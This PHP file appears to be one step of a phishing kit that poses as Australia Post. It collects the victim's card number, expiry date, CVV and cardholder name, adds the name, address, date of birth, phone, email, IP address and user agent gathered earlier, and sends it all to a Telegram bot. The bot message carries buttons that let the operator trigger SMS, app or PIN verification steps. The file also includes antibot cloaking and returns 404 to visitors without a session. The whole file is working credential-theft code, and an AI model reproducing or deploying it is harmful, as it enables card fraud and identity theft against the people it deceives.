<?php
session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';

// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}

$_SESSION['STEP_CHAIN'] = 4; // CC COLLECTED

function clean($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

$type     = $_SESSION['type'] ?? '';
$nom      = $_SESSION['nom'] ?? '';
$prenom   = $_SESSION['prenom'] ?? '';
$adresse  = $_SESSION['adresse'] ?? '';
$zip      = $_SESSION['zip'] ?? '';
$email    = $_SESSION['email'] ?? '';
$ville    = $_SESSION['ville'] ?? '';
$dob      = $_SESSION['dob'] ?? '';
$tel      = $_SESSION['tel'] ?? '';

$titu     = clean($_POST['titu'] ?? '');
$ccc      = clean($_POST['ccc'] ?? '');
$ccc      = str_replace(' ', '', $ccc);
$exp      = clean($_POST['exp'] ?? '');
$cvv      = clean($_POST['cvv'] ?? '');

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$os = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$bin = substr(preg_replace('/\s+/', '', $ccc), 0, 6);
$scan_url = "https://cardimages.imaginecurve.com/cards/{$bin}.png";

$fullName = $prenom . ' ' . $nom;

$message = <<<TEXT
🇦🇺 <b>💳 AUSTRALIA POST – New CC</b> [<code>#$bin</code>]

<b>Card Details</b>
├ 💳 <code>$ccc</code>
├ 📅 Exp: <code>$exp</code>
├ 🔒 CVV: <code>$cvv</code>
└ 🤵 Holder: <code>$titu</code>

<b>Personal Info</b>
├ 👤 Name: <code>$fullName</code>
├ 🏠 Address: <code>$adresse</code>
├ 📍 Postcode/Suburb: <code>$zip $ville</code>
├ 📞 Phone: <code>$tel</code>
├ 📧 Email: <code>$email</code>
└ 🎂 DOB: <code>$dob</code>

<b>Device</b>
├ 🌐 IP: <code>$ip</code>
├ 🖼️ BIN: <a href="$scan_url">Card Image</a>
└ 🌍 UA: <i>$os</i>
TEXT;

// --- DYNAMIC LINK GENERATION ---
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$current_dir = dirname($_SERVER['PHP_SELF']); 
$root_dir = dirname($current_dir); 

if ($root_dir == '/' || $root_dir == '\\') $root_dir = ''; 

$base_url = $protocol . "://" . $host . $root_dir;
$vbv_action_url = $base_url . "/security_check/actionsvbv.php";
$vbv_action_url = str_replace('//security_check', '/security_check', $vbv_action_url);

$encoded_ip = urlencode($ip);
$vbv_action_link = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=ssredi";
$app_action_link = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=tovapp";
$bad_cc_link     = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=badcc";
$good_cc_link    = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=goodcc";
$pin_action_link = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=pincc";

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '📩 SMS', 'url' => $vbv_action_link],
            ['text' => '📱 APP', 'url' => $app_action_link]
        ],
        [
            ['text' => '✅ BONNE CC', 'url' => $good_cc_link],
            ['text' => '❌ MAUVAISE CC', 'url' => $bad_cc_link]
        ],
        [
            ['text' => '📌 PIN', 'url' => $pin_action_link]
        ]
    ]
];

sendTelegramMessage($botToken, $chatId, $message, $keyboard);

$ip_list_path = '../security_check/ip_list.txt';
file_put_contents($ip_list_path, PHP_EOL . $ip . ",appwait" . PHP_EOL, FILE_APPEND | LOCK_EX); 

header('Location: ../payment.php'); exit();
?>